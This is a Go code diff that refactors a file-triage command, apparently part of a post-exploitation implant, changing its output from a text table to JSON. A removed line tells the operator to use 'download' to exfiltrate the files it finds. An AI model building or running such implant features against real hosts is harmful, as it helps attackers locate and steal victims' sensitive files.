@@ -7,7 +7,6 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
-	"time"
 
 	"fawkes/pkg/structs"
 )
@@ -26,10 +25,10 @@ type triageArgs struct {
 }
 
 type triageResult struct {
-	Path    string
-	Size    int64
-	ModTime time.Time
-	Category string
+	Path     string `json:"path"`
+	Size     int64  `json:"size"`
+	ModTime  string `json:"modified"`
+	Category string `json:"category"`
 }
 
 func (c *TriageCommand) Execute(task structs.Task) structs.CommandResult {
@@ -88,35 +87,25 @@ func (c *TriageCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Format output
-	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("=== FILE TRIAGE — %d files found ===\n\n", len(results)))
-
-	totalSize := int64(0)
-	categoryCounts := make(map[string]int)
-
-	sb.WriteString(fmt.Sprintf("%-10s %-12s %-10s %s\n", "Category", "Size", "Modified", "Path"))
-	sb.WriteString(strings.Repeat("-", 80) + "\n")
-
-	for _, r := range results {
-		totalSize += r.Size
-		categoryCounts[r.Category]++
-		sb.WriteString(fmt.Sprintf("%-10s %-12s %-10s %s\n",
-			r.Category,
-			formatTriageSize(r.Size),
-			r.ModTime.Format("2006-01-02"),
-			r.Path))
+	if len(results) == 0 {
+		return structs.CommandResult{
+			Output:    "[]",
+			Status:    "success",
+			Completed: true,
+		}
 	}
 
-	sb.WriteString("\n--- Summary ---\n")
-	sb.WriteString(fmt.Sprintf("Total: %d files, %s\n", len(results), formatTriageSize(totalSize)))
-	for cat, count := range categoryCounts {
-		sb.WriteString(fmt.Sprintf("  %s: %d\n", cat, count))
+	data, err := json.Marshal(results)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling output: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
 	}
-	sb.WriteString("\nUse 'download' to exfiltrate individual files.\n")
 
 	return structs.CommandResult{
-		Output:    sb.String(),
+		Output:    string(data),
 		Status:    "success",
 		Completed: true,
 	}
@@ -270,7 +259,7 @@ func triageCustom(task structs.Task, args triageArgs) []triageResult {
 		results = append(results, triageResult{
 			Path:     path,
 			Size:     info.Size(),
-			ModTime:  info.ModTime(),
+			ModTime:  info.ModTime().Format("2006-01-02 15:04"),
 			Category: "custom",
 		})
 		return nil
@@ -313,7 +302,7 @@ func triageScan(task structs.Task, paths []string, extensions []string, category
 				results = append(results, triageResult{
 					Path:     path,
 					Size:     info.Size(),
-					ModTime:  info.ModTime(),
+					ModTime:  info.ModTime().Format("2006-01-02 15:04"),
 					Category: category,
 				})
 			}
@@ -354,7 +343,7 @@ func triageScanPatterns(task structs.Task, paths []string, patterns []string, ca
 					results = append(results, triageResult{
 						Path:     path,
 						Size:     info.Size(),
-						ModTime:  info.ModTime(),
+						ModTime:  info.ModTime().Format("2006-01-02 15:04"),
 						Category: category,
 					})
 					break
@@ -366,12 +355,3 @@ func triageScanPatterns(task structs.Task, paths []string, patterns []string, ca
 	return results
 }
 
-func formatTriageSize(bytes int64) string {
-	if bytes < 1024 {
-		return fmt.Sprintf("%dB", bytes)
-	}
-	if bytes < 1024*1024 {
-		return fmt.Sprintf("%.1fKB", float64(bytes)/1024)
-	}
-	return fmt.Sprintf("%.1fMB", float64(bytes)/(1024*1024))
-}
